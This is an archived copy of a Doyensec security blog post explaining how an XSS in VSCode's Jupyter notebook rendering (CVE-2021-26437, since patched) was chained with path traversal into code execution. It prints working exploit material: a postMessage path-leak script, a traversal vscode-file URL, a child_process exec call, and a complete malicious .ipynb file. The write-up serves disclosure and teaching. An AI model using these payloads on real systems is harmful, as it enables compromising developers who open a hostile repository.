---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-10-27_visual-studio-code-jupyter-notebook-rce.md
original_filename: 2022-10-27_visual-studio-code-jupyter-notebook-rce.md
title: Visual Studio Code Jupyter Notebook RCE
category: notes
detected_topics:
- xss
- command-injection
- path-traversal
tags:
- imported
- notes
- xss
- command-injection
- path-traversal
language: en
raw_sha256: 1920001b773288fea3d9ba05cb3346c64d95674b8838f71ff5c36a2f0c13fdfa
text_sha256: 787c7230d3d2771cdfb6992c02f24d7871962938c5ce130c4d881150a0ab6e8b
ingested_at: '2026-06-28T07:32:15Z'
sensitivity: unknown
redactions_applied: false
---

# Visual Studio Code Jupyter Notebook RCE

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-10-27_visual-studio-code-jupyter-notebook-rce.md
- Source Type: markdown
- Detected Topics: xss, command-injection, path-traversal
- Ingested At: 2026-06-28T07:32:15Z
- Redactions Applied: False
- Raw SHA256: `1920001b773288fea3d9ba05cb3346c64d95674b8838f71ff5c36a2f0c13fdfa`
- Text SHA256: `787c7230d3d2771cdfb6992c02f24d7871962938c5ce130c4d881150a0ab6e8b`


## Content

---
title: "Visual Studio Code Jupyter Notebook RCE"
page_title: "Visual Studio Code Jupyter Notebook RCE · Doyensec's Blog"
url: "https://blog.doyensec.com/2022/10/27/jupytervscode.html"
final_url: "https://blog.doyensec.com/2022/10/27/jupytervscode.html"
authors: ["Luca Carettoni (@lucacarettoni)"]
programs: ["Microsoft"]
bugs: ["RCE", "XSS", "Arbitrary file read", "Electron"]
publication_date: "2022-10-27"
added_date: "2022-10-28"
source: "pentester.land/writeups.json"
original_index: 1979
---

[![](/public/images/doyensec-logo.svg)](/index.html)

[![](/public/images/logo.svg)](/index.html)

#### ABOUT US

We are [**security engineers**](https://doyensec.com) who break bits and tell stories.  
  
Visit us  
[doyensec.com](https://doyensec.com)  
  
Follow us  
[@doyensec](https://twitter.com/doyensec)  
  
Engage us  
[info@doyensec.com](mailto:info@doyensec.com)  
  

#### Blog Archive

  * 2026

  * 2025

  * 2024

  * 2023

  * 2022

  * 2021

  * 2020

  * 2019

  * 2018

  * 2017

© 2026 [Doyensec LLC](https://doyensec.com) [![](/public/images/rss.png)](/atom.xml "RSS")

# Visual Studio Code Jupyter Notebook RCE

27 Oct 2022 - Posted by Luca Carettoni

I spared a few hours over the past weekend to look into the exploitation of this [Visual Studio Code .ipynb Jupyter Notebook bug](https://github.com/justinsteven/advisories/blob/master/2021_vscode_ipynb_xss_arbitrary_file_read.md) discovered by [Justin Steven](https://twitter.com/justinsteven) in August 2021.

Justin discovered a Cross-Site Scripting (XSS) vulnerability affecting the VSCode built-in support for Jupyter Notebook (`.ipynb`) files.
  
  
  {
  "cells": [
  {
  "cell_type": "code",
  "execution_count": null,
  "source": [],
  "outputs": [
  {
  "output_type": "display_data",
  "data": {"text/markdown": "<img src=x onerror='console.log(1)'>"}
  }
  ]
  }
  ]
  }
  

His analysis details the issue and shows a proof of concept which reads arbitrary files from disk and then leaks their contents to a remote server, however it is not a complete RCE exploit.

> I could not find a way to leverage this XSS primitive to achieve arbitrary code execution, but someone more skilled with Electron exploitation may be able to do so. […]

Given our focus on ElectronJs (and many other web technologies), I decided to look into potential exploitation venues.

As the first step, I took a look at the overall design of the application in order to identify the configuration of each `BrowserWindow/BrowserView/Webview` in use by VScode. Facilitated by [ElectroNG](https://get-electrong.com/), it is possible to observe that the application uses a single `BrowserWindow` with `nodeIntegration:on`.

![ElectroNG VScode](../../../public/images/electrongvscode.png)

This `BrowserWindow` loads content using the `vscode-file` protocol, which is similar to the `file` protocol. Unfortunately, our injection occurs in a nested sandboxed iframe as shown in the following diagram:

![VScode BrowserWindow Design](../../../public/images/VScodeBrowserWindowDesign.png)

In particular, our `sandbox` iframe is created using the following attributes:
  
  
  allow-scripts allow-same-origin allow-forms allow-pointer-lock allow-downloads
  

By default, `sandbox` makes the browser treat the iframe as if it was coming from another origin, even if its `src` points to the same site. Thanks to the `allow-same-origin` attribute, this limitation is lifted. As long as the content loaded within the webview is also hosted on the local filesystem (within the app folder), we can access the `top` window. With that, we can simply execute code using something like `top.require('child_process').exec('open /System/Applications/Calculator.app');`

So, **how do we place our arbitrary HTML/JS content within the application install folder?**

Alternatively, **can we reference resources outside that folder?**

The answer comes from a [recent presentation](https://i.blackhat.com/USA-22/Thursday/US-22-Purani-ElectroVolt-Pwning-Popular-Desktop-Apps.pdf) I watched at the latest Black Hat USA 2022 briefings. In exploiting [CVE-2021-43908](https://blog.electrovolt.io/posts/vscode-rce/), [TheGrandPew](https://twitter.com/TheGrandPew) and [s1r1us](https://twitter.com/S1r1u5_) use a path traversal to load arbitrary files outside of VSCode installation path.

`vscode-file://vscode-app/Applications/Visual Studio Code.app/Contents/Resources/app/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F/somefile.html`

Similarly to their exploit, we can attempt to leverage a `postMessage`’s reply to leak the path of current user directory. In fact, our payload can be placed inside the malicious repository, together with the Jupyter Notebook file that triggers the XSS.

After a couple of hours of trial-and-error, I discovered that we can obtain a reference of the `img` tag triggering the XSS by forcing the execution during the `onload` event.

![Path Leak VScode](../../../public/images/vscodepathleak.png)

With that, all of the ingredients are ready and I can finally assemble the final exploit.
  
  
  var apploc = '/Applications/Visual Studio Code.app/Contents/Resources/app/'.replace(/ /g, '%20');
  var repoloc;
  window.top.frames[0].onmessage = event => {
  if(event.data.args.contents && event.data.args.contents.includes('<base href')){  
  var leakloc = event.data.args.contents.match('<base href=\"(.*)\"')[1];
  var repoloc = leakloc.replace('https://file%2B.vscode-resource.vscode-webview.net','vscode-file://vscode-app'+apploc+'..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..');
  setTimeout(async()=>console.log(repoloc+'poc.html'), 3000)
  location.href=repoloc+'poc.html';
  }
  };
  window.top.postMessage({target: window.location.href.split('/')[2],channel: 'do-reload'}, '*');
  

To deliver this payload inside the `.ipynb` file we still need to overcome one last limitation: the current implementation results in a malformed JSON. The injection happens within a JSON file (double-quoted) and our Javascript payload contains quoted strings as well as double-quotes used as a delimiter for the regular expression that is extracting the path.

After a bit of tinkering, the easiest solution involves the backtick ` character instead of the quote for all JS strings.

The final `pocimg.ipynb` file looks like:
  
  
  {
  "cells": [
  {
  "cell_type": "code",
  "execution_count": null,
  "source": [],
  "outputs": [
  {
  "output_type": "display_data",
  "data": {"text/markdown": "<img src='a445fff1d9fd4f3fb97b75202282c992.png' onload='var apploc = `/Applications/Visual Studio Code.app/Contents/Resources/app/`.replace(/ /g, `%20`);var repoloc;window.top.frames[0].onmessage = event => {if(event.data.args.contents && event.data.args.contents.includes(`<base href`)){var leakloc = event.data.args.contents.match(`<base href=\"(.*)\"`)[1];var repoloc = leakloc.replace(`https://file%2B.vscode-resource.vscode-webview.net`,`vscode-file://vscode-app`+apploc+`..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..`);setTimeout(async()=>console.log(repoloc+`poc.html`), 3000);location.href=repoloc+`poc.html`;}};window.top.postMessage({target: window.location.href.split(`/`)[2],channel: `do-reload`}, `*`);'>"}
  }
  ]
  }
  ]
  }
  

By opening a malicious repository with this file, we can finally trigger our code execution.

  
The built-in Jupyter Notebook extension opts out of the protections given by the _Workspace Trust_ feature introduced in Visual Studio Code 1.57, hence no further user interaction is required. For the record, this issue was fixed in VScode 1.59.1 and Microsoft assigned [CVE-2021-26437](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26437) to it.

### Other relevant posts:

  * ###  [ Building a Secure Electron Auto-Updater 16 Feb 2026 ](/2026/02/16/electron-safe-updater.html)

  * ###  [ Diving Into Electron Web API Permissions 27 Sep 2022 ](/2022/09/27/electron-api-default-permissions.html)

  * ###  [ ElectroNG, our premium SAST tool released! 06 Sep 2022 ](/2022/09/06/electrong-launch.html)

  * ###  [ Electron APIs Misuse: An Attacker’s First Choice 16 Feb 2021 ](/2021/02/16/electron-apis-misuse.html)

  * ###  [ Don't Clone That Repo: Visual Studio Code^2 Execution 16 Mar 2020 ](/2020/03/16/vscode_codeexec.html)
